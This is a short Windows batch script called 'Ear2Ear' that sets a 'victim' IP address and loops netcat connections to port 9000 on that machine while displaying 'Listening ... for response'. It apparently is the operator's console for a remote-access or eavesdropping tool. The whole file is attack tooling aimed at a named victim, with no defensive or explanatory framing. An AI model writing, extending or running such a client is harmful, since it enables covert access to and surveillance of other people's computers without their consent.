@echo off

title Ear2Ear
color 0a
cd bin
set ipvictim=nul
mode con: cols=60 lines=12
cmdow.exe "Ear2Ear" /MOV 1 500
cmdow.exe "Administrator:  Ear2Ear" /MOV 1 500
call ipvictim.bat


:listen
cls
type logos\listener.lmao
echo.
echo.
echo 	Listening to [%ipvictim%: 9000] for response...
echo.
goto closer

:closer
nc %ipvictim% 9000
goto closer